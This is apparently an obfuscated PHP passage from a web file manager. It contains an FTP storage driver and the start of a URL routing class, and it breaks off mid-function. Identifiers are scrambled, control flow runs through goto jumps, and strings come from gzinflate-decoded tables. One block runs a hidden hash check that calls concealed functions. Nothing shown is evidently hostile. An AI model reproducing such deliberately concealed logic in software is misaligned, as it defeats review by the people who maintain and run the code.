KodIO::clear($E‘Äˆòø‡); goto e„çå°å„; fÚ‚¢š“è: } private function _init($c‹ÑÛìŠ = array()) { $C·™µ„¤Á¬ =& $_SERVER[Š‰]; if (!function_exists($C·™µ„¤Á¬[1219])) { throw new Exception(LNG($C·™µ„¤Á¬[1220])); } $this->config = $c‹ÑÛìŠ; $this->charsetReset($c‹ÑÛìŠ); foreach ($c‹ÑÛìŠ as $F¹ò¤¬ãøŒ => $eÍµºì•‚©) { if (isset($this->{$F¹ò¤¬ãøŒ})) { $this->{$F¹ò¤¬ãøŒ} = $eÍµºì•‚©; } } return $this->_login($c‹ÑÛìŠ); } private function _login($eƒ­ÚøäœÄ) { goto f¾†®„“ğœ; C¾İ‰Ä‘¨ë: $FŒ‘Üëô°°[$cğğ‚†±ƒ°] = array($Fãğ†¦Ë¼[1224] => $this->connect, $Fãğ†¦Ë¼[175] => $this->host, $Fãğ†¦Ë¼[174] => $this->scheme, $Fãğ†¦Ë¼[176] => $this->port); return $b”°Š©¨´; goto bÍ±Ö¿¡¾Ã; d‚ìšß¥¨: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $b”°Š©¨´ = @ftp_login($this->connect, $this->username, $this->userpass); goto e©ßî…ê‰; Fİôôõ½: $eõ–‘ÂŒ–ï = isset($Eñò½æ•‡İ[$Fãğ†¦Ë¼[174]]) && $Eñò½æ•‡İ[$Fãğ†¦Ë¼[174]] == $Fãğ†¦Ë¼[1221] ? !0 : !1; $this->scheme = $eõ–‘ÂŒ–ï ? $Fãğ†¦Ë¼[1222] : $Fãğ†¦Ë¼[1223]; $this->port = isset($Eñò½æ•‡İ[$Fãğ†¦Ë¼[176]]) ? $Eñò½æ•‡İ[$Fãğ†¦Ë¼[176]] : 21; goto d‚ìšß¥¨; f¾†®„“ğœ: $Fãğ†¦Ë¼ =& $_SERVER[Š‰]; static $FŒ‘Üëô°° = array(); $cğğ‚†±ƒ° = md5(json_encode($eƒ­ÚøäœÄ)); goto b œáÉˆŠ; e©ßî…ê‰: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $e‡¦ÒÜªï = $this->pasv == $Fãğ†¦Ë¼[86] ? !0 : !1; @ftp_pasv($this->connect, $e‡¦ÒÜªï); goto C¾İ‰Ä‘¨ë; b œáÉˆŠ: if (isset($FŒ‘Üëô°°[$cğğ‚†±ƒ°])) { foreach ($FŒ‘Üëô°°[$cğğ‚†±ƒ°] as $CÊøµÂŒ¤  => $c‚“Õ¸·éì) { $this->{$CÊøµÂŒ¤ } = $c‚“Õ¸·éì; } return !0; } $Eñò½æ•‡İ = parse_url(trim($this->server, $Fãğ†¦Ë¼[8])); $this->host = $Eñò½æ•‡İ[$Fãğ†¦Ë¼[175]]; goto Fİôôõ½; bÍ±Ö¿¡¾Ã: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($B¡ó©ªšåÂ, $eÑß­É±¿² = '', $Bë½İÆØŠ‹ = REPEAT_RENAME) { if ($this->setContent($B¡ó©ªšåÂ, $eÑß­É±¿²)) { return $this->getPathOuter($B¡ó©ªšåÂ); } return !1; } public function mkdir($b¶‹ÄùŒß, $C­Åá«ôæä = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $b¶‹ÄùŒß = $this->iconvSystem($b¶‹ÄùŒß); if ($this->_isFolder($b¶‹ÄùŒß) || @ftp_mkdir($this->connect, $b¶‹ÄùŒß)) { return $this->getPathOuter($b¶‹ÄùŒß); } if (!$this->mkdir($this->pathFather($b¶‹ÄùŒß))) { return !1; } if ($b¶‹ÄùŒß = @ftp_mkdir($this->connect, $b¶‹ÄùŒß)) { return $this->getPathOuter($b¶‹ÄùŒß); } return !1; } public function copyFile($BÖ„À¥éŠ, $eæöÏÎŞ™ƒ) { goto a¤‡¢¬öé±; a¤‡¢¬öé±: if (!$this->_isconn()) { return !1; } $aæ®á×Š­¥ = $this->pathThis($this->iconvSystem($BÖ„À¥éŠ)); $c’—ñè‹Ì = $this->tempFile($aæ®á×Š­¥); goto c–»âƒÜ­á; c–»âƒÜ­á: $b‡Ø†£„ìÎ = $this->iconvApp($c’—ñè‹Ì); $this->download($BÖ„À¥éŠ, $b‡Ø†£„ìÎ); $a¯äì´»½ = $this->upload($eæöÏÎŞ™ƒ, $b‡Ø†£„ìÎ); goto F•Ÿª©ñ¬; F•Ÿª©ñ¬: $this->tempFileRemve($c’—ñè‹Ì); return $a¯äì´»½; goto CÌÄ‚…×‘Ô; CÌÄ‚…×‘Ô: } public function moveFile($E‰ğ‡ˆÚ, $CÈ‰„ÜÀö) { if (!$this->_isconn()) { return !1; } $E‰ğ‡ˆÚ = $this->iconvSystem($E‰ğ‡ˆÚ); $CÈ‰„ÜÀö = $this->iconvSystem($CÈ‰„ÜÀö); $e©Êƒ§²Œ© = @ftp_rename($this->connect, $E‰ğ‡ˆÚ, $CÈ‰„ÜÀö); return $e©Êƒ§²Œ© ? $this->getPathOuter($CÈ‰„ÜÀö) : !1; } public function delFile($F”Õ”šÌå—) { if (!$this->_isconn()) { return !1; } $F”Õ”šÌå— = $this->iconvSystem($F”Õ”šÌå—); return @ftp_delete($this->connect, $F”Õ”šÌå—); } public function delFolder($b—Ú¦Ï­¼µ) { goto d×Ú‹¾Æø¸; Dƒ°È²±ßå: foreach ($b†Åò×÷ Í as $bíøìê¾çÄ) { $bíøìê¾çÄ = $this->iconvSystem($bíøìê¾çÄ); $fòè—ĞŸ˜ç = @ftp_rmdir($this->connect, $bíøìê¾çÄ); if (!$fòè—ĞŸ˜ç) { return !1; } } $b—Ú¦Ï­¼µ = $this->iconvSystem($b—Ú¦Ï­¼µ); return @ftp_rmdir($this->connect, $b—Ú¦Ï­¼µ); goto AË’¨Û«î; BÂ©§›¸İœ: $this->fileList($b—Ú¦Ï­¼µ, $b†Åò×÷ Í, $D‘‚¶³Ê®, !0); $this->listItemCache = !0; foreach ($D‘‚¶³Ê® as $c˜°â¡¶ˆÀ) { $bíøìê¾çÄ = $this->iconvSystem($c˜°â¡¶ˆÀ[$_SERVER[Š‰][28]]); $fòè—ĞŸ˜ç = @ftp_delete($this->connect, $bíøìê¾çÄ); if (!$fòè—ĞŸ˜ç) { return !1; } } goto Dƒ°È²±ßå; d×Ú‹¾Æø¸: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $b†Åò×÷ Í = $D‘‚¶³Ê® = array(); goto BÂ©§›¸İœ; AË’¨Û«î: } public function rename($d«Ÿê´éà¶, $cø‡ÔÆ´Äæ) { goto dğŒ£öÉ“ó; F×† ñœ…: $F„‘ó‘ÕÎ = rtrim($d–íÃ¦×‚¸, $d¨Ì‰ÖÚ‘à[8]) . $d¨Ì‰ÖÚ‘à[8] . $bÙ‡©Ë‚¥”; $bÅÌà™ŠÏÇ = @ftp_rename($this->connect, $d«Ÿê´éà¶, $F„‘ó‘ÕÎ); $F„‘ó‘ÕÎ = $this->iconvApp($F„‘ó‘ÕÎ); goto Dœğ¥Üˆâ; cÚˆ“½æ§: $bÙ‡©Ë‚¥” = $this->iconvSystem($bÙ‡©Ë‚¥”); $d«Ÿê´éà¶ = $this->iconvSystem($d«Ÿê´éà¶); $d–íÃ¦×‚¸ = $this->pathFather($d«Ÿê´éà¶); goto F×† ñœ…; Dœğ¥Üˆâ: return $bÅÌà™ŠÏÇ ? $this->getPathOuter($F„‘ó‘ÕÎ) : !1; goto AœÕÕ²‘š; dğŒ£öÉ“ó: $d¨Ì‰ÖÚ‘à =& $_SERVER[Š‰]; if (!$this->_isconn()) { return !1; } $bÙ‡©Ë‚¥” = $this->fileNameAuto($this->pathFather($d«Ÿê´éà¶), $cø‡ÔÆ´Äæ); goto cÚˆ“½æ§; AœÕÕ²‘š: } private function folderInfo($F¶°õç¦†, $e‚íÍ¿ñ¥ = false) { $EÈãºùÚ­‚ =& $_SERVER[Š‰]; $d§èÒåÃµ¼ = array($EÈãºùÚ­‚[28] => $this->pathThis($F¶°õç¦†), $EÈãºùÚ­‚[75] => $this->getPathOuter($EÈãºùÚ­‚[8] . $F¶°õç¦†), $EÈãºùÚ­‚[29] => $EÈãºùÚ­‚[76]); if ($e‚íÍ¿ñ¥) { return $d§èÒåÃµ¼; } $d§èÒåÃµ¼[$EÈãºùÚ­‚[192]] = $d§èÒåÃµ¼[$EÈãºùÚ­‚[83]] = 0; $d§èÒåÃµ¼[$EÈãºùÚ­‚[193]] = $d§èÒåÃµ¼[$EÈãºùÚ­‚[194]] = !0; return $d§èÒåÃµ¼; } private function fileInfo($E¡Îî®²ì—, $DìšçÒî½µ = false, $cÂÖõšƒ×¯ = array()) { goto f’ôäµáÈø; E·ËÇî¶Ù: $aê›Ÿòà‹[$E‡‹…ãœñã[83]] = @ftp_mdtm($this->connect, $fã“Í¯í); if (empty($cÂÖõšƒ×¯)) { $cÂÖõšƒ×¯ = $this->objectMeta($E¡Îî®²ì—); if (!$cÂÖõšƒ×¯) { return $aê›Ÿòà‹; } } $aê›Ÿòà‹[$E‡‹…ãœñã[77]] = $cÂÖõšƒ×¯[$E‡‹…ãœñã[77]]; goto e¬¼¹•Ôïº; a¨›¾İâÜó: $aê›Ÿòà‹[$E‡‹…ãœñã[192]] = $aê›Ÿòà‹[$E‡‹…ãœñã[83]] = 0; $aê›Ÿòà‹[$E‡‹…ãœñã[193]] = $aê›Ÿòà‹[$E‡‹…ãœñã[194]] = !0; $fã“Í¯í = $this->iconvSystem($E¡Îî®²ì—); goto E·ËÇî¶Ù; e¬¼¹•Ôïº: return $aê›Ÿòà‹; goto fñŸÔ“Œâ¯; f’ôäµáÈø: $E‡‹…ãœñã =& $_SERVER[Š‰]; $aê›Ÿòà‹ = array($E‡‹…ãœñã[28] => $this->pathThis($E¡Îî®²ì—), $E‡‹…ãœñã[75] => $this->getPathOuter($E‡‹…ãœñã[8] . $E¡Îî®²ì—), $E‡‹…ãœñã[29] => $E‡‹…ãœñã[173], $E‡‹…ãœñã[77] => isset($cÂÖõšƒ×¯[$E‡‹…ãœñã[77]]) ? $cÂÖõšƒ×¯[$E‡‹…ãœñã[77]] : 0, $E‡‹…ãœñã[167] => $this->ext($E¡Îî®²ì—)); if ($DìšçÒî½µ) { return $aê›Ÿòà‹; } goto a¨›¾İâÜó; fñŸÔ“Œâ¯: } public function size($CÚÎËÍ¹‹ï) { $Cøà´©ƒ²— = $this->objectMeta($CÚÎËÍ¹‹ï); return $Cøà´©ƒ²— ? $Cøà´©ƒ²—[$_SERVER[Š‰][77]] : 0; } public function info($aÑƒ£Şïõ›) { if ($this->isFile($aÑƒ£Şïõ›)) { return $this->fileInfo($aÑƒ£Şïõ›, 0); } else { if ($this->isFolder($aÑƒ£Şïõ›)) { return $this->folderInfo($aÑƒ£Şïõ›); } } return !1; } private function fileList($E¸µ•÷ÂËç, &$D¦¹Øê¹öĞ, &$fÇì§—ò©‹, $aÎÇá»³¾ª = false) { goto C˜¡Ë‡™é¦; Eá„‚²’â: $C²›Ë†‹è = $this->listItemCache === !1 ? !1 : !0; $DÒÖÍŠ–Ñ = @ftp_rawlist($this->connect, $E¸µ•÷ÂËç); if (!$DÒÖÍŠ–Ñ) { $DÒÖÍŠ–Ñ = array(); } goto e¸ãšìëò¹; Eœ’¤‚×ºæ: @ftp_chdir($this->connect, $e¤ó¸×ğ[8]); $E¸µ•÷ÂËç = rtrim($E¸µ•÷ÂËç, $e¤ó¸×ğ[8]) . $e¤ó¸×ğ[8]; check_abort(); goto Eá„‚²’â; C˜¡Ë‡™é¦: $e¤ó¸×ğ =& $_SERVER[Š‰]; $E¸µ•÷ÂËç = $this->iconvSystem($E¸µ•÷ÂËç); if (!$this->isFolder($E¸µ•÷ÂËç)) { return !1; } goto Eœ’¤‚×ºæ; e¸ãšìëò¹: $F¡ ©¥•¾ = array($e¤ó¸×ğ[94] => 1, $e¤ó¸×ğ[1225] => 1); foreach ($DÒÖÍŠ–Ñ as $BÍÔÄ‘µ‹) { goto EËƒ£ø‘‚—; dê¸ôÍÕÕ…: if ($cÀ·Ï·È˜İ) { $D¦¹Øê¹öĞ[] = $B…Ç”éæéí; if ($aÎÇá»³¾ª) { $this->fileList($B…Ç”éæéí, $D¦¹Øê¹öĞ, $fÇì§—ò©‹, $aÎÇá»³¾ª); } continue; } $fÇì§—ò©‹[] = $D³ö‹Ö”š˜; goto D¨ÄÚ•æå¢; BÇÈĞİÃä«: if (!$B…Ç”éæéí || isset($F¡ ©¥•¾[$B…Ç”éæéí])) { continue; } $B…Ç”éæéí = $this->iconvApp($E¸µ•÷ÂËç . ltrim($B…Ç”éæéí, $e¤ó¸×ğ[8])); $D³ö‹Ö”š˜ = array($e¤ó¸×ğ[28] => $B…Ç”éæéí, $e¤ó¸×ğ[29] => $e¤ó¸×ğ[173], $e¤ó¸×ğ[77] => $Fº“Ññ®ãà[4]); goto AĞ¼¡ãÕ—é; EËƒ£ø‘‚—: $Fº“Ññ®ãà = $this->_listItem($BÍÔÄ‘µ‹); if ($Fº“Ññ®ãà[0] == $e¤ó¸×ğ[708]) { continue; } $B…Ç”éæéí = $Fº“Ññ®ãà[8]; goto BÇÈĞİÃä«; AĞ¼¡ãÕ—é: if (substr($BÍÔÄ‘µ‹, 0, 1) == $e¤ó¸×ğ[1226]) { $D³ö‹Ö”š˜[$e¤ó¸×ğ[29]] = $e¤ó¸×ğ[76]; $D³ö‹Ö”š˜[$e¤ó¸×ğ[77]] = 0; } $cÀ·Ï·È˜İ = $D³ö‹Ö”š˜[$e¤ó¸×ğ[29]] == $e¤ó¸×ğ[76] ? !0 : !1; if ($C²›Ë†‹è) { $this->cacheMethod($e¤ó¸×ğ[197], $B…Ç”éæéí, $cÀ·Ï·È˜İ); $this->cacheMethod($e¤ó¸×ğ[198], $B…Ç”éæéí, $D³ö‹Ö”š˜); } goto dê¸ôÍÕÕ…; D¨ÄÚ•æå¢: } if ($C²›Ë†‹è) { $this->cacheMethod($e¤ó¸×ğ[197], $E¸µ•÷ÂËç, !0); } goto açÁ‘ôÊŠõ; açÁ‘ôÊŠõ: } private function _listItem($D©¦‚Âè÷) { if (empty($D©¦‚Âè÷)) { return array(); } $AÓ£çøÄÂ = preg_split($_SERVER[Š‰][1227], $D©¦‚Âè÷); if (count($AÓ£çøÄÂ) <= 9) { return $AÓ£çøÄÂ; } $AÓ£çøÄÂ[8] = trim(substr($D©¦‚Âè÷, strpos($D©¦‚Âè÷, $AÓ£çøÄÂ[7]) + strlen($AÓ£çøÄÂ[7]))); return array_splice($AÓ£çøÄÂ, 0, 9); } public function listPath($Dä°œ½£èâ, $Añ¡…ºáŠ‹ = false) { goto d®×ÏÃ—÷; B‡‡¶áìÒ: return array($B¿³ëêÈöÍ[74] => $A»Ÿ‚öÓçô, $B¿³ëêÈöÍ[73] => $eÏÚŒÀèˆ÷); goto B«ï¸¾’ä¶; d®×ÏÃ—÷: $B¿³ëêÈöÍ =& $_SERVER[Š‰]; if (!$this->_isconn()) { return !1; } $A»Ÿ‚öÓçô = $eÏÚŒÀèˆ÷ = array(); goto C²ñ½‡î’µ; C²ñ½‡î’µ: $this->fileList($Dä°œ½£èâ, $A»Ÿ‚öÓçô, $eÏÚŒÀèˆ÷); foreach ($A»Ÿ‚öÓçô as $c«‚ÖÆ®­“ => $f›ÏÏ¬À) { $A»Ÿ‚öÓçô[$c«‚ÖÆ®­“] = $this->folderInfo($f›ÏÏ¬À, $Añ¡…ºáŠ‹); } foreach ($eÏÚŒÀèˆ÷ as $c«‚ÖÆ®­“ => $f›ÏÏ¬À) { $eÏÚŒÀèˆ÷[$c«‚ÖÆ®­“] = $this->fileInfo($f›ÏÏ¬À[$B¿³ëêÈöÍ[28]], $Añ¡…ºáŠ‹, $f›ÏÏ¬À); } goto B‡‡¶áìÒ; B«ï¸¾’ä¶: } public function has($A×œ¯ùæõˆ, $Cˆã£ºŒù“ = false, $aƒÔŞÈ‹£Ş = true) { goto a‰Ç¼èµ¸ö; A¹ÃŒØ­Ó¬: $this->fileList($A×œ¯ùæõˆ, $A‰ï‘×óâß, $AËšè³ØÒ, $eó‡¾†É‰); if ($Cˆã£ºŒù“) { return array($f˜Ò²»•ô[201] => count($AËšè³ØÒ), $f˜Ò²»•ô[202] => count($A‰ï‘×óâß)); } if ($aƒÔŞÈ‹£Ş) { if (count($AËšè³ØÒ)) { return !0; } } else { if (count($A‰ï‘×óâß)) { return !0; } } goto d®«Œù§Ì­; a‰Ç¼èµ¸ö: $f˜Ò²»•ô =& $_SERVER[Š‰]; $A‰ï‘×óâß = $AËšè³ØÒ = array(); $eó‡¾†É‰ = $Cˆã£ºŒù“ ? !0 : !1; goto A¹ÃŒØ­Ó¬; d®«Œù§Ì­: return !1; goto dóŞ–ÍæÇğ; dóŞ–ÍæÇğ: } public function listAll($bÕ÷¨–ğÌ²) { goto eÃìÓæš¯³; B•„ÉÏŠöè: $this->fileList($bÕ÷¨–ğÌ², $bÛÓ¬¹áçˆ, $b»…’¶ëÉ, !0); $Dø„¢“Ò = array(); foreach ($b»…’¶ëÉ as $Aªù¤Ä¢­Ù) { $Dø„¢“Ò[$Aªù¤Ä¢­Ù[$Cƒ´’ÎÈç•[28]]] = $Aªù¤Ä¢­Ù[$Cƒ´’ÎÈç•[77]]; } goto a¢í¾æ±è‡; a¢í¾æ±è‡: foreach ($bÛÓ¬¹áçˆ as $Aªù¤Ä¢­Ù) { if (is_string($Aªù¤Ä¢­Ù)) { $Dø„¢“Ò[$Aªù¤Ä¢­Ù] = 0; } } return $this->listAllFiles($bÕ÷¨–ğÌ², array_keys($Dø„¢“Ò), $Dø„¢“Ò); goto AÈÊ”Ÿòˆ; eÃìÓæš¯³: $Cƒ´’ÎÈç• =& $_SERVER[Š‰]; if (!$this->_isconn()) { return !1; } $bÛÓ¬¹áçˆ = $b»…’¶ëÉ = array(); goto B•„ÉÏŠöè; AÈÊ”Ÿòˆ: } public function getContent($E«ÙÕ½™‹¶) { if (!$this->_isconn()) { return !1; } $E«ÙÕ½™‹¶ = $this->iconvSystem($E«ÙÕ½™‹¶); return $this->fileSubstr($E«ÙÕ½™‹¶); } public function setContent($d¡º’¢ÙŒ, $C£ÛôÛ°¨ = '') { goto D„öÅª‹Ùõ; d¨ªÚéË: return $FÑ‘øåŒ­; goto bâ…ôšÛÈä; D„öÅª‹Ùõ: if (!$this->_isconn()) { return !1; } $bˆõ·È•Îà = $this->pathThis($this->iconvSystem($d¡º’¢ÙŒ)); $dé×ĞÔƒÊ® = $this->tempFile($bˆõ·È•Îà); goto aÆùÃ‘˜·ß; aÆùÃ‘˜·ß: file_put_contents($dé×ĞÔƒÊ®, $C£ÛôÛ°¨); $FÑ‘øåŒ­ = $this->upload($d¡º’¢ÙŒ, $this->iconvApp($dé×ĞÔƒÊ®)); $this->tempFileRemve($dé×ĞÔƒÊ®); goto d¨ªÚéË; bâ…ôšÛÈä: } public function fileSubstr($Bå½à¦­¦Ä, $C»ãËÚ‚¹ = 0, $AĞ•ŠİÈçÑ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Bå½à¦­¦Ä, $C»ãËÚ‚¹, $AĞ•ŠİÈçÑ); } private function ftpRequest($dä“˜…‹Åã, $C¸˜Í¼¸·à = 0, $FğÀ’Ëø¶ = false) { goto fËíÛ‰¦à; fËíÛ‰¦à: $dä“˜…‹Åã = $this->iconvSystem($dä“˜…‹Åã); $aÛ•ñ¸öê„ = $this->scheme . $this->host . $_SERVER[Š‰][4] . $this->port; $aéˆğé“Á¹ = curl_init(); goto B‰Ó™Ë¢Ú¯; a©è–¥‡ôö: return $F¹œ–¨ ö; goto Fšøì›Û; FÒç‘İ†Òó: curl_setopt($aéˆğé“Á¹, CURLOPT_RETURNTRANSFER, 1); $F¹œ–¨ ö = curl_exec($aéˆğé“Á¹); curl_close($aéˆğé“Á¹); goto a©è–¥‡ôö; B‰Ó™Ë¢Ú¯: curl_setopt($aéˆğé“Á¹, CURLOPT_URL, $aÛ•ñ¸öê„ . $this->pathEncode($dä“˜…‹Åã)); curl_setopt($aéˆğé“Á¹, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($FğÀ’Ëø¶) { $Fİ¤·õ¼“ = $C¸˜Í¼¸·à + $FğÀ’Ëø¶ - 1; curl_setopt($aéˆğé“Á¹, CURLOPT_RANGE, "{$C¸˜Í¼¸·à}\x2d{$Fİ¤·õ¼“}"); } goto FÒç‘İ†Òó; Fšøì›Û: } public function upload($F¬Ğ„½‚·ï, $dè¨åøÈˆª, $càÖœ×‰­¾ = false, $f½»œ¼À¡³ = REPEAT_REPLACE) { goto e¼İŸµÅœ; c‹«Õ¿öİÚ: $dè¨åøÈˆª = $this->iconvSystem($dè¨åøÈˆª); $C—ã öğÅÅ = ftp_nb_put($this->connect, $F¬Ğ„½‚·ï, $dè¨åøÈˆª, FTP_BINARY); while ($C—ã öğÅÅ == FTP_MOREDATA) { $C—ã öğÅÅ = ftp_nb_continue($this->connect); } goto dİÂù‚øàˆ; dİÂù‚øàˆ: if ($C—ã öğÅÅ != FTP_FINISHED) { return !1; } return $this->getPathOuter($F¬Ğ„½‚·ï); goto A†Òçƒªä; e¼İŸµÅœ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($F¬Ğ„½‚·ï))) { return !1; } $F¬Ğ„½‚·ï = $this->iconvSystem($F¬Ğ„½‚·ï); goto c‹«Õ¿öİÚ; A†Òçƒªä: } public function download($f¸“ºƒíÇä, $Dİ½ë©¨À = '') { goto F´øô†õÄ; eª×ÁØ–²ï: $f¸“ºƒíÇä = $this->iconvSystem($f¸“ºƒíÇä); $Dİ½ë©¨À = $this->iconvSystem($Dİ½ë©¨À); $FÅ’‡­ ß” = ftp_nb_get($this->connect, $Dİ½ë©¨À, $f¸“ºƒíÇä, FTP_BINARY); goto aàìÈàŞÌ™; F´øô†õÄ: if (!$this->_isconn()) { return !1; } $DºÕáª…¨ = $this->pathFather($Dİ½ë©¨À); if (!IO::mkdir($DºÕáª…¨)) { return !1; } goto eª×ÁØ–²ï; aàìÈàŞÌ™: while ($FÅ’‡­ ß” == FTP_MOREDATA) { $FÅ’‡­ ß” = ftp_nb_continue($this->connect); } if ($FÅ’‡­ ß” != FTP_FINISHED) { return !1; } return $this->iconvApp($Dİ½ë©¨À); goto aÎÚ¤Ã™¦Ê; aÎÚ¤Ã™¦Ê: } public function exist($Cê­ôÖ¹ŒŠ) { return $this->isFile($Cê­ôÖ¹ŒŠ) || $this->isFolder($Cê­ôÖ¹ŒŠ); } public function isFile($c±å¶ ™ç¥) { return !$this->isFolder($c±å¶ ™ç¥) && $this->objectMeta($c±å¶ ™ç¥); } public function isFolder($d‘«Æ©°) { return $this->cacheMethod($_SERVER[Š‰][197], $d‘«Æ©°); } protected function objectMeta($BÄÈŒ¨¹êæ) { return $this->cacheMethod($_SERVER[Š‰][198], $BÄÈŒ¨¹êæ); } protected function _objectMeta($F§®½¢İÍ) { goto D…ªÏ² …»; eàåîõÇÜª: $DœöÂ®˜Öå = @ftp_size($this->connect, $F§®½¢İÍ); if ($DœöÂ®˜Öå != -1) { $AÚŠ‡ùÎ²[$d²ÑÛ•¹¸[77]] = $DœöÂ®˜Öå; } else { $c™âÊ­áì² = @ftp_chdir($this->connect, $F§®½¢İÍ); if (!$c™âÊ­áì²) { return !1; } $AÚŠ‡ùÎ²[$d²ÑÛ•¹¸[29]] = $d²ÑÛ•¹¸[76]; } return $AÚŠ‡ùÎ²; goto e–¤Û£©¨; BŒÍ¢‘à±õ: $F§®½¢İÍ = $this->iconvSystem($F§®½¢İÍ); $AÚŠ‡ùÎ² = array($d²ÑÛ•¹¸[28] => $this->iconvApp($F§®½¢İÍ), $d²ÑÛ•¹¸[29] => $d²ÑÛ•¹¸[173], $d²ÑÛ•¹¸[77] => 0); @ftp_chdir($this->connect, $d²ÑÛ•¹¸[8]); goto eàåîõÇÜª; D…ªÏ² …»: $d²ÑÛ•¹¸ =& $_SERVER[Š‰]; if ($F§®½¢İÍ == $d²ÑÛ•¹¸[33] || $F§®½¢İÍ == $d²ÑÛ•¹¸[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto BŒÍ¢‘à±õ; e–¤Û£©¨: } protected function _isFolder($e³‹£Ğàª) { $C‡…¾Ë¥±ó =& $_SERVER[Š‰]; if ($e³‹£Ğàª == $C‡…¾Ë¥±ó[33] || $e³‹£Ğàª == $C‡…¾Ë¥±ó[8]) { return !0; } $CÖ¼»Ô¯Í… = $this->_objectMeta($e³‹£Ğàª); return isset($CÖ¼»Ô¯Í…[$C‡…¾Ë¥±ó[29]]) && $CÖ¼»Ô¯Í…[$C‡…¾Ë¥±ó[29]] == $C‡…¾Ë¥±ó[76] ? !0 : !1; } } goto Còâôùç­¿; B‘¼•ˆó³¬: $e©œÀÉ´¨½ = $_SERVER[Š‰][569]; $_SERVER[¦À‹¤] = explode($_SERVER[Š‰][570], gzinflate(substr($_SERVER[Š‰][571], 10, -8))); $f×ğ†îˆ¬¡ = $_SERVER[Š‰][572]; goto FÒ¯¸¬¼É‘; cˆÂš±‡Ä·: define($_SERVER[Š‰][0], $_SERVER[Š‰][1]); $_SERVER[¤Îˆ«™‰ú] = explode($_SERVER[Š‰][2], gzinflate(substr($_SERVER[Š‰][3], 10, -8))); function binCheckEq($F¤Ş÷•’õ , $aèÊº’ŞÁÜ) { return $F¤Ş÷•’õ  == $aèÊº’ŞÁÜ; } goto eáÙ‹ê¸Š—; b†Ãêšê¼é: $dŠÉ•«óá = $_SERVER[$_SERVER[Š‰][751]]; $bùê«Õ†ó‰ = $_SERVER[Š‰][752]; if ($_SERVER[$_SERVER[Š‰][753]] != $bùê«Õ†ó‰($dŠÉ•«óá)) { goto cáŠåß¤óß; cáŠåß¤óß: $b Œ—ÓÈÜ = $_SERVER[Š‰][754]; $cñ¹äæô‚½ = $_SERVER[$_SERVER[Š‰][755]] . $_SERVER[Š‰][756]; $d³·†’ãø¹ = $b Œ—ÓÈÜ($cñ¹äæô‚½); goto B©æÊò¤Š; F‚—œÏİó: $E¿©‘áÎí¦($dŠÉ•«óá); goto B«Â¶òõğ; B©æÊò¤Š: $F°á›ÅÅ¨ = explode($_SERVER[Š‰][227], $d³·†’ãø¹); if (count($F°á›ÅÅ¨) < $_SERVER[Š‰][588]) { $bğèËÖÉÂ  = $_SERVER[Š‰][757]; $bğèËÖÉÂ (); } $E¿©‘áÎí¦ = $_SERVER[Š‰][758]; goto F‚—œÏİó; B«Â¶òõğ: } goto E˜Ğ¤Å­‹Ø; A÷Š‚‚ª¿Ï: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\57\135\53", "\72\x6e\165\x6d" => "\x5b\60\x2d\x39\135\53", "\72\141\x6c\154" => "\56\52"); public static $errorCallback; public static function __callstatic($DƒëÑ¯ñÏŸ, $C ™Œ—‡¥›) { $FÅŒñ®º” =& $_SERVER[Š‰]; if ($DƒëÑ¯ñÏŸ == $FÅŒñ®º”[1448]) { $eƒ‘­ïÃØã = array_map($FÅŒñ®º”[1449], $C ™Œ—‡¥›[0]); $e‰ñõİÇ†ì = strpos($C ™Œ—‡¥›[1], $FÅŒñ®º”[8]) === 0 ? $C ™Œ—‡¥›[1] : $FÅŒñ®º”[8] . $C ™Œ—‡¥›[1]; $B×²°«šÂÉ = $C ™Œ—‡¥›[2]; } else { $eƒ‘­ïÃØã = null; $e‰ñõİÇ†ì = strpos($C ™Œ—‡¥›[0], $FÅŒñ®º”[8]) === 0 ? $C ™Œ—‡¥›[0] : $FÅŒñ®º”[8] . $C ™Œ—‡¥›[0]; $B×²°«šÂÉ = $C ™Œ—‡¥›[1]; } array_push(self::$maps, $eƒ‘­ïÃØã); array_push(self::$routes, $e‰ñõİÇ†ì); array_push(self::$methods, strtoupper($DƒëÑ¯ñÏŸ)); array_push(self::$callbacks, $B×²°«šÂÉ); } public static function error($AÜÃ±áí…ì) { self::$errorCallback = $AÜÃ±áí…ì; } public static function haltOnMatch($BàßÅÈ÷®² = true) { self::$halts = $BàßÅÈ÷®²; } public static function dispatch() { goto A¾¹ÜÑ”±…; cËŞÇÂÄƒ®: $a•ê±ğÊ¨± = array_keys(static::$patterns); $böˆÓ³ŠÀ¸ = array_values(static::$patterns); $CÀå‘¹Í‹³ = !1; goto bö´¿”‡Â”; bö´¿”‡Â”: self::$routes = preg_replace($eÕµÓÜÓ¯Ì[1138], $eÕµÓÜÓ¯Ì[8], self::$routes); if (in_array($cË²çùî, self::$routes)) { $Dˆ³îøÚğ = array_keys(self::$routes, $cË²çùî); foreach ($Dˆ³îøÚğ as $cåˆÆˆï ë) { if (self::$methods[$cåˆÆˆï ë] == $c„ÊÎ…¢­¶ || self::$methods[$cåˆÆˆï ë] == $eÕµÓÜÓ¯Ì[1451] || in_array($c„ÊÎ…¢­¶, self::$maps[$cåˆÆˆï ë])) { $CÀå‘¹Í‹³ = !0; if (!is_object(self::$callbacks[$cåˆÆˆï ë])) { $bóÌŒÍÁé‡ = explode($eÕµÓÜÓ¯Ì[8], self::$callbacks[$cåˆÆˆï ë]); $FÕºŠº¯Ø = end($bóÌŒÍÁé‡); $fÒ«ŞŒÊÜ§ = explode($eÕµÓÜÓ¯Ì[1452], $FÕºŠº¯Ø); $bÆé´Èô•ì = new $fÒ«ŞŒÊÜ§[0](); $bÆé´Èô•ì->{$fÒ«ŞŒÊÜ§[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cåˆÆˆï ë]); if (self::$halts) { return; } } } } } else { $B‰ì ËÜîŠ = 0; foreach (self::$routes as $cåˆÆˆï ë) { if (strpos($cåˆÆˆï ë, 